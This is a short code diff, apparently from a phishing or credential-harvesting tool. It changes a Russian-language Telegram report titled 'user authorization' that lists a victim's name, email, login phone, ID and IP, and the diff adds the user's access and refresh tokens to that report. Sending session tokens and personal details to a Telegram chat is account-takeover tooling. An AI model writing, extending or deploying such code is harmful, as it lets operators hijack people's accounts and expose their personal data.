@@ -129,12 +129,13 @@ def get_token():
         # ---------- TELEGRAM MSG ----------
         msg = (
             "👤 <b>АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
-            f"<b>Email:</b> <code>{email}</code>\n"
-            f"<b>IP:</b> <code>{user_ip}</code>\n\n"
-            f"<b>ID:</b> {user_data.get('id')}\n"
             f"<b>Имя:</b> {user_data.get('name')}\n"
-            f"<b>Статус:</b> {user_data.get('status')}\n"
-            f"<b>Телефон входа:</b> {user_data.get('phone_login')}\n\n"
+            f"<b>Email:</b> <code>{email}</code>\n"
+            f"<b>Телефон входа:</b><code> {user_data.get('phone_login')}</code>\n\n"
+            f"<b>ACCESS TOKEN:</b> <code>{access}</code>\n"
+            f"<b>REFRESH TOKEN:</b> <code>{refresh}</code>\n\n"
+            f"<b>ID:</b> {user_data.get('id')}\n"
+            f"<b>IP:</b> <code>{user_ip}</code>\n\n"
             "<b>📦 Объявления:</b>\n"
         )
 
